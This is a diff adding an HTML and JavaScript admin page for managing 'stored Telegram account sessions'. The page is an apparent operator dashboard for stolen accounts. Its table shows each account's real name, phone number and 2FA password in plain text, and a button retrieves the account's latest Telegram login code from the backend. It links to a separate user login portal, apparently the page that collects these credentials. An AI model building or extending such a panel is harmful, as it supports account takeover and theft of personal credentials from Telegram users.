@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Session Management Portal</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #090d16;
+            --card-bg: rgba(18, 26, 43, 0.85);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --success: #10b981;
+            --danger: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+
+        body {
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(at 80% 20%, rgba(37, 99, 235, 0.15) 0px, transparent 50%);
+            color: var(--text-main);
+            min-height: 100vh;
+            padding: 2.5rem 1rem;
+        }
+
+        .container { max-width: 1100px; margin: 0 auto; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .brand { display: flex; align-items: center; gap: 0.8rem; }
+        .brand-icon { font-size: 2rem; }
+        h1 { font-size: 1.4rem; font-weight: 700; }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 2rem;
+            box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.4);
+            margin-bottom: 2rem;
+        }
+
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.65rem 1.2rem;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .btn:hover { background: var(--primary-hover); }
+        .btn-secondary { background: rgba(255, 255, 255, 0.1); color: var(--text-main); text-decoration: none; }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.2); }
+        .btn-danger { background: var(--danger); padding: 0.35rem 0.7rem; font-size: 0.8rem; }
+        .btn-danger:hover { background: #dc2626; }
+        .btn-otp { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); padding: 0.35rem 0.7rem; font-size: 0.8rem; border-radius: 6px; font-weight: 600; cursor: pointer; }
+        .btn-otp:hover { background: rgba(16, 185, 129, 0.35); }
+
+        .form-group { margin-bottom: 1.2rem; }
+        label { display: block; margin-bottom: 0.4rem; font-size: 0.85rem; color: var(--text-muted); font-weight: 600; }
+
+        input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: rgba(9, 13, 22, 0.8);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-main);
+            font-size: 1rem;
+            outline: none;
+        }
+        input:focus { border-color: var(--primary); }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+        th, td { padding: 0.9rem 1rem; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 0.9rem; }
+        th { color: var(--text-muted); font-weight: 600; text-transform: uppercase; font-size: 0.75rem; }
+
+        .badge { padding: 0.2rem 0.6rem; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
+        .badge-active { background: rgba(16, 185, 129, 0.2); color: #34d399; }
+
+        .alert { padding: 0.9rem; border-radius: 8px; margin-bottom: 1.2rem; font-size: 0.9rem; }
+        .alert-error { background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; }
+
+        .hidden { display: none !important; }
+        .login-box { max-width: 420px; margin: 3rem auto; }
+
+        .pass-tag {
+            font-family: monospace;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            padding: 0.25rem 0.55rem;
+            border-radius: 6px;
+            color: #6ee7b7;
+            font-size: 0.88rem;
+            font-weight: 600;
+        }
+
+        .otp-badge {
+            font-family: monospace;
+            background: rgba(59, 130, 246, 0.2);
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            padding: 0.25rem 0.55rem;
+            border-radius: 6px;
+            color: #93c5fd;
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: 0.1em;
+        }
+
+        @media (max-width: 640px) {
+            body { padding: 1.2rem 0.6rem; }
+            header { flex-direction: column; align-items: flex-start; gap: 1rem; }
+            .card { padding: 1.2rem 1rem; border-radius: 14px; }
+            input { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ADMIN LOGIN PROMPT -->
+        <div id="admin-login-card" class="card login-box">
+            <div style="text-align: center; margin-bottom: 1.5rem;">
+                <div style="font-size: 3rem; margin-bottom: 0.5rem;">🔒</div>
+                <h2>Admin Login</h2>
+                <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.3rem;">Enter Admin Password to manage saved sessions</p>
+            </div>
+            <div id="admin-alert"></div>
+            <form onsubmit="handleAdminLogin(event)">
+                <div class="form-group">
+                    <label>Admin Password</label>
+                    <input type="password" id="admin_pass" placeholder="Enter admin password" required autofocus>
+                </div>
+                <button type="submit" class="btn" style="width: 100%; justify-content: center;">🔓 Unlock Admin Portal</button>
+            </form>
+            <div style="text-align: center; margin-top: 1.5rem;">
+                <a href="/" style="color: var(--text-muted); text-decoration: none; font-size: 0.85rem;">← Back to Login Portal</a>
+            </div>
+        </div>
+
+        <!-- ADMIN DASHBOARD (Protected) -->
+        <div id="admin-dashboard" class="hidden">
+            <header>
+                <div class="brand">
+                    <span class="brand-icon">🔒</span>
+                    <div>
+                        <h1>Admin Session Management</h1>
+                        <p style="font-size: 0.85rem; color: var(--text-muted);">Manage stored Telegram account sessions, 2FA passwords & login verification codes</p>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 0.8rem;">
+                    <a href="/" class="btn btn-secondary">🏠 User Login Portal</a>
+                    <button class="btn btn-secondary" onclick="handleAdminLogout()">🚪 Logout</button>
+                </div>
+            </header>
+
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <h3>All Stored Sessions</h3>
+                    <button class="btn btn-secondary" onclick="loadAdminAccounts()">🔄 Refresh</button>
+                </div>
+                <div style="overflow-x: auto; -webkit-overflow-scrolling: touch; width: 100%; margin-top: 1rem;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Telegram Real Name</th>
+                                <th>Phone Number</th>
+                                <th>Status</th>
+                                <th>2FA Password</th>
+                                <th>Recent Login Code</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="admin-table">
+                            <tr><td colspan="7" style="text-align: center; color: var(--text-muted); padding: 2rem;">Loading sessions...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function checkAdminAuth() {
+            try {
+                const res = await fetch('/api/admin/accounts');
+                if (res.ok) {
+                    showDashboard();
+                } else {
+                    showLogin();
+                }
+            } catch (err) {
+                showLogin();
+            }
+        }
+
+        async function handleAdminLogin(e) {
+            e.preventDefault();
+            const password = document.getElementById('admin_pass').value;
+
+            try {
+                const res = await fetch('/api/admin/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password })
+                });
+                const data = await res.json();
+
+                if (res.ok) {
+                    showDashboard();
+                } else {
+                    document.getElementById('admin-alert').innerHTML = `<div class="alert alert-error">${data.detail || 'Incorrect password.'}</div>`;
+                }
+            } catch (err) {
+                document.getElementById('admin-alert').innerHTML = `<div class="alert alert-error">Network error.</div>`;
+            }
+        }
+
+        async function handleAdminLogout() {
+            await fetch('/api/admin/logout', { method: 'POST' });
+            showLogin();
+        }
+
+        function showDashboard() {
+            document.getElementById('admin-login-card').classList.add('hidden');
+            document.getElementById('admin-dashboard').classList.remove('hidden');
+            loadAdminAccounts();
+        }
+
+        function showLogin() {
+            document.getElementById('admin-dashboard').classList.add('hidden');
+            document.getElementById('admin-login-card').classList.remove('hidden');
+            document.getElementById('admin_pass').value = '';
+            document.getElementById('admin-alert').innerHTML = '';
+        }
+
+        async function loadAdminAccounts() {
+            try {
+                const res = await fetch('/api/admin/accounts');
+                const data = await res.json();
+                const accounts = data.accounts || [];
+
+                const tbody = document.getElementById('admin-table');
+                tbody.innerHTML = '';
+
+                if (accounts.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: var(--text-muted); padding: 2.5rem;">No stored Telegram sessions found.</td></tr>';
+                } else {
+                    accounts.forEach(acc => {
+                        const tr = document.createElement('tr');
+                        const twoFA = acc.two_fa_pass 
+                            ? `<span class="pass-tag">🔑 ${acc.two_fa_pass}</span>`
+                            : `<span style="color: var(--text-muted);">—</span>`;
+
+                        tr.innerHTML = `
+                            <td>${acc.id}</td>
+                            <td><strong>${acc.label || acc.display_name || 'Telegram User'}</strong></td>
+                            <td>${acc.phone}</td>
+                            <td><span class="badge badge-active">${(acc.status || 'ACTIVE').toUpperCase()}</span></td>
+                            <td>${twoFA}</td>
+                            <td id="otp-cell-${acc.id}">
+                                <button class="btn-otp" onclick="fetchOTP(${acc.id})">📩 Get Code</button>
+                            </td>
+                            <td>
+                                <button class="btn btn-danger" onclick="deleteSession(${acc.id})">Delete Session</button>
+                            </td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        async function fetchOTP(accId) {
+            const cell = document.getElementById(`otp-cell-${accId}`);
+            cell.innerHTML = `<span style="color: var(--text-muted); font-size: 0.85rem;">Checking...</span>`;
+
+            try {
+                const res = await fetch(`/api/admin/accounts/${accId}/otp`);
+                const data = await res.json();
+
+                if (res.ok && data.status === 'ok') {
+                    cell.innerHTML = `
+                        <div>
+                            <span class="otp-badge">${data.code}</span>
+                            <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.2rem;">${data.received_at}</div>
+                        </div>
+                    `;
+                } else {
+                    cell.innerHTML = `<span style="color: var(--text-muted); font-size: 0.8rem;">No code found</span>`;
+                }
+            } catch (err) {
+                cell.innerHTML = `<span style="color: var(--danger); font-size: 0.8rem;">Failed</span>`;
+            }
+        }
+
+        async function deleteSession(id) {
+            if (!confirm('Are you sure you want to delete this session?')) return;
+            await fetch(`/api/admin/accounts/${id}`, { method: 'DELETE' });
+            loadAdminAccounts();
+        }
+
+        checkAdminAuth();
+    </script>
+</body>
+</html>
